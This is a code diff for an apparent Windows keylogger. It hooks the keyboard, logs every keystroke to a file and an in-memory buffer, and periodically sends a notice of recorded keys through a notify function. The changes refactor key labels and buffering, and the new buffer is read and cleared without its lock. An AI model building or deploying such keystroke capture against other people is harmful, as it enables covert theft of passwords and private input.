@@ -29,52 +29,53 @@ std::map<wchar_t, wchar_t> layeredKeys = {
 
 // map to track keystrokes that cannot be mapped with MapVirtualKeyExW
 std::map<int, std::wstring> mapSpecialKeys = {
-    {VK_BACK, L"[BACKSPACE]"},
-    {VK_RETURN, L"[ENTER]"},
+    {VK_BACK, L"BACKSPACE"},
+    {VK_RETURN, L"ENTER"},
     {VK_SPACE, L"_"},
-    {VK_TAB, L"[TAB]"},
-    {VK_LWIN, L"[WIN]"},
-    {VK_RWIN, L"[WIN]"},
-    {VK_ESCAPE, L"[ESCAPE]"},
-    {VK_END, L"[END]"},
-    {VK_HOME, L"[HOME]"},
-    {VK_LEFT, L"[LEFT]"},
-    {VK_RIGHT, L"[RIGHT]"},
-    {VK_UP, L"[UP]"},
-    {VK_DOWN, L"[DOWN]"},
-    {VK_PRIOR, L"[PG_UP]"},
-    {VK_NEXT, L"[PG_DOWN]"},
+    {VK_TAB, L"TAB"},
+    {VK_LWIN, L"WIN"},
+    {VK_RWIN, L"WIN"},
+    {VK_ESCAPE, L"ESCAPE"},
+    {VK_END, L"END"},
+    {VK_HOME, L"HOME"},
+    {VK_LEFT, L"LEFT"},
+    {VK_RIGHT, L"RIGHT"},
+    {VK_UP, L"UP"},
+    {VK_DOWN, L"DOWN"},
+    {VK_PRIOR, L"PG_UP"},
+    {VK_NEXT, L"PG_DOWN"},
     {VK_OEM_PERIOD, L"."},
     {VK_DECIMAL, L"."},
     {VK_OEM_PLUS, L"+"},
     {VK_OEM_MINUS, L"-"},
     {VK_ADD, L"+"},
     {VK_SUBTRACT, L"-"},
-    {VK_INSERT, L"[INSERT]"},
-    {VK_DELETE, L"[DELETE]"},
-    {VK_PRINT, L"[PRINT]"},
-    {VK_SNAPSHOT, L"[PRINTSCREEN]"},
-    {VK_SCROLL, L"[SCROLL]"},
-    {VK_PAUSE, L"[PAUSE]"},
-    {VK_NUMLOCK, L"[NUMLOCK]"},
-    {VK_F1, L"[F1]"},
-    {VK_F2, L"[F2]"},
-    {VK_F3, L"[F3]"},
-    {VK_F4, L"[F4]"},
-    {VK_F5, L"[F5]"},
-    {VK_F6, L"[F6]"},
-    {VK_F7, L"[F7]"},
-    {VK_F8, L"[F8]"},
-    {VK_F9, L"[F9]"},
-    {VK_F10, L"[F10]"},
-    {VK_F11, L"[F11]"},
-    {VK_F12, L"[F12]"},
+    {VK_INSERT, L"INSERT"},
+    {VK_DELETE, L"DELETE"},
+    {VK_PRINT, L"PRINT"},
+    {VK_SNAPSHOT, L"PRINTSCREEN"},
+    {VK_SCROLL, L"SCROLL"},
+    {VK_PAUSE, L"PAUSE"},
+    {VK_NUMLOCK, L"NUMLOCK"},
+    {VK_F1, L"F1"},
+    {VK_F2, L"F2"},
+    {VK_F3, L"F3"},
+    {VK_F4, L"F4"},
+    {VK_F5, L"F5"},
+    {VK_F6, L"F6"},
+    {VK_F7, L"F7"},
+    {VK_F8, L"F8"},
+    {VK_F9, L"F9"},
+    {VK_F10, L"F10"},
+    {VK_F11, L"F11"},
+    {VK_F12, L"F12"},
 };
 
 HHOOK ghHook;
 KBDLLHOOKSTRUCT kbdStruct;
-std::wfstream logFile;
+std::wofstream logFile;
 std::mutex logFileMutex;
+std::wstring logFileBuffer;
 HANDLE breachEvent = NULL;
 
 // stores booleans for mod keys
@@ -106,10 +107,10 @@ void KeyboardMod::start(){
 
     wprintf(L"Hook successfully installed!\n");
 
-    std::thread monitorTimeThread(setLogFile);
+    std::thread timeMonitor(setLogFile);
 
     breachEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
-    std::thread notifyThread(sendNotice);
+    std::thread breachMonitor(sendNotice);
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)){
@@ -172,7 +173,6 @@ void setLogFile(){
     std::cout << logFileName << std::endl;
 
     logFile.open(logFileName, std::ios_base::app);
-    logFile.seekg(0, logFile.end);
 
     logFileMutex.unlock();
 
@@ -251,7 +251,8 @@ void logKeystroke(int vkCode){
     output << L"]";
 
     logFileMutex.lock();
-    logFile << output.str() << '\n';
+    logFile << output.str();
+    logFileBuffer += output.str();
     logFile.flush();
     logFileMutex.unlock();
 }
@@ -350,12 +351,14 @@ void sendNotice(){
         systemTime.wSecond = localTimeFuture->tm_sec;
         systemTime.wMilliseconds = 0;
 
-        FILETIME fileTime;
-        SystemTimeToFileTime(&systemTime, &fileTime);
+        FILETIME fileTimeLocal;
+        SystemTimeToFileTime(&systemTime, &fileTimeLocal);
+        FILETIME fileTimeUTC;
+        LocalFileTimeToFileTime(&fileTimeLocal, &fileTimeUTC);
 
         LARGE_INTEGER dueTime;
-        dueTime.HighPart = fileTime.dwHighDateTime;
-        dueTime.LowPart = fileTime.dwLowDateTime;
+        dueTime.HighPart = fileTimeUTC.dwHighDateTime;
+        dueTime.LowPart = fileTimeUTC.dwLowDateTime;
 
         HANDLE hTimer = CreateWaitableTimer(NULL, 1, NULL);
 
@@ -363,25 +366,13 @@ void sendNotice(){
 
         WaitForSingleObject(hTimer, INFINITE);
 
-        logFileMutex.lock();
-
-        std::streampos oldOffset = logFile.tellg();
-        logFile.seekg(0, logFile.end);
-        std::streampos addedCharCount = logFile.tellg() - oldOffset;
-
-        if (!addedCharCount){
-            continue;
-        }
-
-        logFile.seekg(addedCharCount, logFile.end);
-
         std::wstringstream noticeStream;
 
-        noticeStream << "The following keystrokes have been recorded in the last " << NOTICE_DELAY/60 << " minutes:\n";
-        noticeStream << logFile.rdbuf();
-
-        logFileMutex.unlock();
+        noticeStream << "The following keystrokes have been recorded in the last " << NOTICE_DELAY / 60 << " minutes:\n";
+        noticeStream << logFileBuffer;
 
         notify(noticeStream.str());
+
+        logFileBuffer.clear();
     }
 }
